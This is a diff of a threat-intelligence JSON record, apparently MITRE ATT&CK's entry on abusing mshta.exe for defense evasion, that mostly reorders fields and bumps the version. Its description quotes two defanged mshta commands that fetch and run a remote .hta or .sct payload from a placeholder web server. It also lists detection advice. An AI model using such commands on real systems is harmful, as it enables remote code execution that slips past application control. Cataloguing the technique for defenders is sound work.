@@ -1,18 +1,16 @@
 {
     "type": "bundle",
-    "id": "bundle--f48a3865-09e6-45cc-be71-c4ab1a9a7579",
+    "id": "bundle--18d6086e-a303-4d9c-adc2-d51ea8a2645e",
     "spec_version": "2.0",
     "objects": [
         {
-            "created": "2020-01-23T19:32:49.557Z",
-            "modified": "2020-12-30T14:29:06.462Z",
-            "kill_chain_phases": [
-                {
-                    "kill_chain_name": "mitre-attack",
-                    "phase_name": "defense-evasion"
-                }
+            "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+            "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+            "name": "Mshta",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
             ],
-            "type": "attack-pattern",
             "external_references": [
                 {
                     "source_name": "mitre-attack",
@@ -60,36 +58,39 @@
                     "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019."
                 }
             ],
-            "object_marking_refs": [
-                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            "type": "attack-pattern",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
             ],
-            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-            "name": "Mshta",
-            "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
-            "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
-            "x_mitre_version": "1.0",
-            "x_mitre_is_subtechnique": true,
-            "x_mitre_permissions_required": [
-                "User"
+            "modified": "2021-10-15T23:59:00.395Z",
+            "created": "2020-01-23T19:32:49.557Z",
+            "x_mitre_platforms": [
+                "Windows"
             ],
-            "x_mitre_defense_bypassed": [
-                "Application control",
-                "Digital Certificate Validation"
+            "x_mitre_contributors": [
+                "@ionstorm",
+                "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
+                "Ricardo Dias"
             ],
-            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
             "x_mitre_data_sources": [
                 "Process: Process Creation",
                 "File: File Creation",
                 "Command: Command Execution",
                 "Network Traffic: Network Connection Creation"
             ],
-            "x_mitre_contributors": [
-                "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
-                "Ricardo Dias"
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
+            "x_mitre_defense_bypassed": [
+                "Application control",
+                "Digital Certificate Validation"
             ],
-            "x_mitre_platforms": [
-                "Windows"
-            ]
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_version": "1.1"
         }
     ]
 }
